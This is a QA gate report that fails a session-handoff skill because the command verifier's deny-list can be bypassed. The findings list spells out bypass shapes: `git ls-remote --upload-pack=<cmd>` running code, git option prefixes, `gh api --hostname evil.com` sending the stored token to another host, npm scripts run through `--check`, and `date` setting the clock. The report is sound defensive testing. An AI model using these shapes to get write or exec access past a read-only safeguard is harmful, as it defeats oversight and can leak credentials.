# QA Report: Task 110 - A session-handoff skill that writes the handoff and re-measures it on read

**Task**: [Link to task document](./task.110.session-handoff-skill.md)
**Gate File**: [task.110.gate.2.session-handoff-skill.yml](./task.110.gate.2.session-handoff-skill.yml)
**QA Engineer**: QA Engineer
**Review Date**: 2026-09-15
**Testing Completed**: 2026-09-15
**Gate Status**: FAIL

---

## Executive Summary

Cycle 1's fixes hold: every shape gate 1 named is refused, the corpus's hostile direction is 0/73 across all five sinks, the group kill is proved by a test and re-proved by mutation. The gate still fails, on a finding one level up: the **deny-list mechanism** cannot hold against binaries whose CLIs accept unambiguous long-option prefixes (`git branch --del`, `--set-upstream-t=`), joined forms (`--write=.`), decorating flags that do not select a mode (`git remote -v add`, `git branch -v newname`), exec-shaped options on "read" subcommands (`git ls-remote --upload-pack=<cmd>`), and a `--check` that npm forwards to any script. Seven HIGH findings, all reproduced against the real binaries in non-mutating forms. The remedy is a replacement — per-binary allow-lists — not a third round of deny-list entries; the third-strike rule is one cycle away and this report says so before it fires.

**Overall Assessment**: FAIL
**Deployment Recommendation**: BLOCKED

---

## Re-Review Context

**Re-review scope: unscoped (prior gate failed on security)** — full `origin/develop...HEAD` diff (3,608 lines, 19 files); cycle 2 refute pass + SAFETY RE-PROBE directives both appended to the reviewer prompt.

| Cycle-1 finding | Status | Evidence |
| --- | --- | --- |
| CR-1 `gh api` joined flags | FIXED | allow-listed read flags; `-XPOST`, `--method=`, `--field=` refused (probe + test) |
| CR-2 `git branch/tag/remote`, `--output=` | FIXED (narrowly) | the named shapes refused — but see cycle-2 CR-2/4/5: the *class* is not closed |
| PRB-1/CR-5 `node -e`, `python3 -c`, `npx <any>` | FIXED | interpreter rule requires a relative script; inline/preload flags refused; npx tool set |
| CR-3 unguarded RegExp | FIXED | `parseExpect` try/catch — mutation-proved by QA (`covered`) |
| CR-4 blank line ends table | FIXED | mutation-proved by QA (`covered`) |
| CR-6 timeout orphan | FIXED | direct spawn + group kill; test with a grandchild; mutation-proved in cycle 1 |
| CR-7 glob quoting | FIXED (by refusal) | `*`/`~`/`$` → `shell expansion not supported`; mutation-proved by QA |
| CR-8 snake_case | FIXED | test |
| CR-9 empty Result cell | FIXED (table path) | see cycle-2 CR-10 for the comment path |
| CR-10 `find -fprint*` | FIXED | test |
| CR-11 grep exit 1 | FIXED | test |
| CR-12 dead split | FIXED | — |
| CR-13 temp dirs | FIXED | `test.after` cleanup |
| bug.1 / bug.2 / bug.3 | CLOSED | verified above; statuses updated in the bug reports |

---

## New Findings This Cycle

Searched unscoped (prior gate: security FAIL): full branch diff; re-enumerated the whitelist's inputs myself — every binary in `WHITELIST`, joined `=` forms, short-flag clusters, `--` separators, git prefix abbreviations, interpreter flags, npm script names, npx tools, `date` positionals — 170 fresh spellings + all 73 corpus cases; the reviewer executed 53 further probes and confirmed each HIGH against the real `git`/`npm` in a non-mutating form.

- **[high]** `handoff-verify.mjs:96` — `git ls-remote --upload-pack=<cmd> .` executes `<cmd>` (reproduced: `--upload-pack='echo UPLOAD_PACK_RAN'` ran echo) → allow-list per subcommand
- **[high]** `handoff-verify.mjs:127` — `git remote -v add evil <url>` / `-v set-url` / `--verbose remove` slip past the early return → validate the whole argv
- **[high]** `handoff-verify.mjs:166` — `npm run format --check` runs `prettier --write .`; `npm run bundle --check` runs the bundler; any script + `--check` runs (QA also: `npm run generate-catalog -- --check` — no such flag exists, the catalog is regenerated) → `--check` only for `bundle`, only as `npm run bundle -- --check`
- **[high]** `handoff-verify.mjs:104` — `git branch -v newname` creates; `-v --del foo` deletes → `-v` is decoration, not a listing selector
- **[high]** `handoff-verify.mjs:106` — git accepts option **prefixes**: `--del`, `--forc`, `--mov`, `--edit-desc`, `--unset-upstrea`, `--set-upstream-t=` (reproduced) → a deny-list cannot enumerate prefixes
- **[high]** (QA probe) `gh api --hostname evil.com repos/x` is admitted — sends the stored token to an arbitrary host
- **[high]** (QA probe) `npx prettier --write=.` — joined form not matched
- **[medium]** `handoff-verify.mjs:172` — npx tools that write by default or by common flag: `tsc` (emits unless `--noEmit`), `-o`/`--output-file`, `--coverage`, `--outputFile=`, `--cache`
- **[medium]** `handoff-verify.mjs:563` — `detached: true` + `spawnSync`: Ctrl-C on the verifier orphans the child; no handler can run while spawnSync blocks
- **[medium]** `handoff-verify.mjs:158` — `lint:fix`, `validate:fix`, `test:update-snapshots` trusted by suffix (QA probe: `npm run lint:fix` accepted)
- **[medium]** `handoff-verify.mjs:248` — `date 0101120026` sets the clock (BSD and GNU) as root
- **[low]** CR-10 comment-path empty figure; CR-11 `--test-reporter=../../evil.mjs` executes outside the cwd; CR-12 quoted `|` in jq/grep refused; CR-13 script args tested against node's inline regex; CR-14 (cleanup) `-o` refusal too broad for `git ls-files -o`

---

## Implementation Verification

| Phase | Status | Test Result | Notes |
| --- | --- | --- | --- |
| Phase 1: contract → SKILL.md | PASS | Verified | whitelist table updated in cycle 1; will need the allow-list rewrite |
| Phase 2: read mode | CONCERNS | Partial | cycle-1 fixes verified; the deny-list mechanism fails the refute pass (7 HIGH) |
| Phase 3: write mode + wiring | PASS | Verified | template links fixed; handoff re-measured 18 confirmed · 0 stale · 2 timeouts |

---

## Success Criteria Verification

Unchanged from cycle 1 except **Code Quality → whitelist is read-only (§10)**: still **FAIL** — a different, more fundamental failure than cycle 1's.

---

## Breaking Changes Validation

None. **Overall:** PASS

---

## Issues Found

**Total Issues**: HIGH: 7, MEDIUM: 4, LOW: 4 (+1 cleanup). Bug reports: [bug.4](./task.110.bug.4.deny-list-mechanism-cannot-hold.md) (all HIGH + the npm/npx/date MEDIUMs — one root cause), [bug.5](./task.110.bug.5.interrupted-verifier-orphans-child.md) (CR-7). LOWs documented here only.

---

## NFR Assessment

### Performance — PASS
### Reliability — CONCERNS
CR-7 (interrupt orphans the child); CR-12 (legitimate quoted patterns refused).
### Security — FAIL
- **Status**: FAIL · **Evidence**: measured · **Probes executed**: 296 (73 corpus + 170 fresh + 53 reviewer)
- The cycle-1 shapes are closed; the mechanism is open. Every HIGH above is a *shape the deny-list author did not think of*, which is the property of deny-lists, not of this author.
### Maintainability — CONCERNS
Two cycles of patching on one file; the third-strike rule (`file:` on HIGH entries across three consecutive gates) fires at cycle 3 if another HIGH lands on `handoff-verify.mjs`. The recommendation below is written so cycle 2's fix is the mechanism replacement the rule would otherwise demand.

---

## Code Review

Reviewer: read-only Explore subagent, `code-review-prompt.md` verbatim + REFUTE PASS + SAFETY RE-PROBE; whole-branch diff; returned in 8m52s with 14 findings (13 bugs, 1 cleanup), 53 probes executed. `code_review_blocking=true` → every `bug` + `confidence: high` promoted (CR-1..7, CR-10..13); CR-8/CR-9 (medium/medium) promoted on the strength of the QA probe's independent confirmation of CR-8 and the reproduction of CR-9.

**Mutation proof (Step 3c)** — cycle-1 fixes, re-run by QA from a `cp` snapshot:
- mutation-proven: `SHELL_EXPANSION` disabled → `whitelist: mutating shapes …` red → **covered**
- mutation-proven: `parseExpect` guard removed → `parse: a malformed or path-shaped expect …` red → **covered**
- mutation-proven: blank line no longer ends table → `parse: a blank line ends the header table …` red → **covered**
- cycle 1's own three (gh flag guard, interpreter rule, group kill) — **dev-only** as far as this report re-ran them; recorded in bug.1/bug.3.

**Boundary probe**: `boundary: true`; `probes_executed: 243` by QA (+53 by the reviewer).

**Platform variance**: `TMPDIR=/tmp node --test …` → 23/23.

**Step 4b**: 1 block, `no-executable-blocks` (`command` prefix; obs #90) — commands run by hand under bash + zsh in cycle 1, unchanged.

---

## Regression Testing

| Area | Result |
| --- | --- |
| Skill suite | 23/23 |
| Full fast gate (cycle-1 fix commit) | PASS — 3293/3294 |
| Live handoff read mode | 18 confirmed · 0 stale · 2 timeouts |

---

## Recommendations

### Immediate Actions (Blocking)
1. **Replace the deny-lists with per-binary allow-lists** (bug.4): for each binary an explicit set of permitted flags — exact and `=value` forms — a positional policy, and refusal of everything else. Prefixes, joined forms, exec-shaped options and decorating-flag bypasses are then refused by construction. Remove `--hostname` from `gh api`; `--check` only as `npm run bundle -- --check`; enumerate npm scripts exactly; npx per-tool flag allow-lists (tsc requires `--noEmit`); `date` only `+format`/read flags.
2. **Async runner with SIGINT/SIGTERM group kill** (bug.5).
3. Tests: every cycle-2 shape in the refused list; a property test that every *accepted* argv contains only allow-listed flags.

### Short-term Actions (Non-Blocking)
CR-10, CR-11, CR-12, CR-13, CR-14.

---

## Final Assessment

**Gate Status**: FAIL
**Rationale**: the safety boundary fails a fresh enumeration for the second time, and the second failure is structural. The fix is known and bounded.
**Quality Score**: 0/100 (100 − 20 × 7 HIGH, bounded)

**Deployment Recommendation**: BLOCKED
**Conditions**: allow-list mechanism; cycle 3 refute pass finds no HIGH.

---

**QA Report**: `task.110.qa.2.session-handoff-skill.md` · **Gate File**: `task.110.gate.2.session-handoff-skill.yml`
**Next Steps**: `/qa-fix` on gate 2 — as a mechanism replacement.
